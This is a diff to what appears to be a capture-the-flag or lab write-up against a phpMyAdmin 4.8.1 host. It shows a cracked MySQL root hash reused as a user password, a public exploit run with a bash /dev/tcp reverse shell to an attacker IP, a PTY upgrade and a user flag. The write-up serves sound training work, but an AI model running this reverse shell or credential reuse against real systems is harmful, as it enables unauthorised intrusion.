@@ -91,6 +91,18 @@ found in index source code:
 
 phpmyadmin version 4.8.1
 
+
+able to find msql user data un the mysql database user table
+
+<img width="1218" height="551" alt="image" src="https://github.com/user-attachments/assets/e993b948-fb95-46ff-ae99-a1c1b86d38b1" />
+
+root acct authentication string: *2B72EB4F3B82A23BA9987F76675B83FE9FE8DDC8
+
+<img width="1033" height="111" alt="image" src="https://github.com/user-attachments/assets/312b3499-d364-4b72-b88f-7ba2ce79d60d" />
+
+this hash is for: `gandalfthewhite`, might be the same password for gandalf ssh user
+
+
 exploit found here: https://www.exploit-db.com/exploits/50457
 
 ```
@@ -111,6 +123,12 @@ reverse shell on port 4479
 python3 50457.py 10.0.5.28 80 /phpmyadmin/ gandalf shallnotpass "bash -c 'exec bash -i &>/dev/tcp/10.0.17.26/4479 <&1'""
 ```
 
-
+once logged in to www-data, swithc to gandalf user with `gandalfthewhite password`, you will get a blank termininal and need to re-instate the session using the following command
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+<img width="320" height="58" alt="image" src="https://github.com/user-attachments/assets/c25feaa0-cffe-42b8-8ab3-110aef7fa3a2" />
+user flag: "82745644-c7f3-4250-acba-aa453abb2249"
+
 
